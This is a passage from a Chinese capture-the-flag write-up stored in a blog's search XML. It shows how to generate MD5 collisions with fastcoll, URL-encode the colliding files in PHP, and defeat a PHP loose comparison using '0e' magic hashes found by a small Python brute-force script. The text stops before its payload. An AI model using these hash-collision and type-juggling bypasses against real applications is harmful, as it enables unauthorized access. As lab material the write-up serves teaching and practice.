test01.txt//-p参数代表根据test1.txt文件随机生成两个相同MD5的文件，注意：生成的MD5与test1.txt不同D:\fastcoll&gt;tail.exe -c 128 test00.txt &gt; a.txt //-c 128代表将test00.txt的最后128位写入文件a，这128位正是test1.txt与test00.txt的MD5不同的原因D:\fastcoll&gt;tail.exe -c 128 test01.txt &gt; b.txt //同理D:\fastcoll&gt;type test0.txt a.txt &gt; test10.txt //这里表示将test0.txt和a.txt文件的内容合并写入test10.txtD:\fastcoll&gt;type test0.txt b.txt &gt; test11.txt //同理写入test11.txt 然后对生成的文件进行URL编码，参考这篇文章：如何用不同的数值构建一样的MD5 1234567891011121314151617&lt;?php function readmyfile($path)&#123; $fh = fopen($path, "rb"); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo 'test01 '. urlencode(readmyfile("test01.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";echo 'test00 '. urlencode(readmyfile("test00.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";echo 'test10 '. urlencode(readmyfile("test10.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";echo 'test11 '. urlencode(readmyfile("test11.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";?&gt; 第二部分 a是大写字母，b是数字且长度不大于6 GET得到的m和n的长度不大于4 str8为a的md5值 str9为b的md5值中的字符m替换为n ($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)，b长度必须为6，a不等于6，a的md5和b的md5替换后的值相同 这里使用0e绕过，a的值很明显为QNKCDZO b的值可以利用这个替换，将一些可能的值替换为我们需要的，is_numeric()函数接受16进制，会把16进制认为是数字，写个脚本找出0e开头的十六进制，然后找出有不大于5个字母数的md5 12345678910import hashlibfor i in range(1000,10000): k = "0x"+str(i) md5_n = hashlib.md5(k.encode()).hexdigest() if md5_n[0:2] == "0e": print(k) print(md5_n) 结果如图，选择0x6156 0ec4899c94ada8d08a6ada8623c6ff01 构造payload：]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>JACTF</tag>
      </tags>
  </entry>
</search>
